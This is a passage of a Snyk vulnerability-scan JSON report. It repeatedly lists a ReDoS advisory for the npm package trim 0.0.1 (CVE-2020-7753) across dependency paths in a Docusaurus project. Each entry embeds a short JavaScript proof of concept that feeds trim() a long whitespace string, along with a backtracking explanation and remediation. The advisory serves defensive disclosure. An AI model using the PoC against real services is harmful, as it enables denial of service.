`ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-google-gtag@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-sitemap@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
